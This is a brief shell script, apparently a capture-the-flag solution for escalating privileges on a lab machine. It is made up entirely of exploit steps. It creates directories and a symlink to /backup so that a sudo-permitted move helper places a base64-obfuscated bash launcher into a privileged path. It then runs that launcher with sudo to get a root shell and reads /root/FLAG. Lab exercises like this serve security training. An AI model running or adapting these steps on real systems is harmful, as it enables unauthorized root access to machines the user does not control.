mkdir /k1dd13safe/pwn
mkdir /k1dd13safe/pwn/pwn
sudo /bin/safemv pwn pwn

ln -s /backup /k1dd13safe/pwn
sudo /bin/safemv pwn pwn

echo "IyEvYmluL2Jhc2gKL2Jpbi9iYXNoCg==" | base64 -d > /k1dd13safe/helloworld
chmod +x /k1dd13safe/helloworld
sudo /bin/safemv helloworld pwn

sudo /backup/helloworld; cat /root/FLAG
/bin/cleanup
